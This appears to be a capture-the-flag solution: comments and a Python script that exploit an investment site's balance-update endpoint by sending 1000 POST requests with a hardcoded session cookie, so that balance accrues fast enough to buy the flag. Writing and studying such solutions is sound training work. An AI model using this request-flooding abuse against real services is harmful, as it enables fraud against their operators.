# After the investment, the site updates the value of your account every second, using intervalId = window. setInterval(update, 1000). after a little digging on the site, you can understand that the update function makes a request for /update_balance/ and receives a json response

# {'balance': 150.0, 'invest': 100, 'proc': 1.0}

# Revenue increases after a POST request is sent. Therefore, you can write a script that will execute queries faster, which will allow you to accumulate the necessary amount quickly enough.


import requests

def sender(x):
    urla = "http://army-invest.vkactf.tk/update_balance"

    data = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'
        } 

    cookies = {
        'session': 'eyJ1c2VybmFtZSI6ImRlYmlsIn0.XwE57g.A0A7FTSYpsikVDDR2LGUM_Ucw4g'
    }
    
    r = requests.post(url = urla, headers = data, cookies=cookies) 
    print(x, r.text)

for x in range(1000):
    sender(x)

# After completion - take the money - invest - launch again and so on to the desired amount 
# and buy flag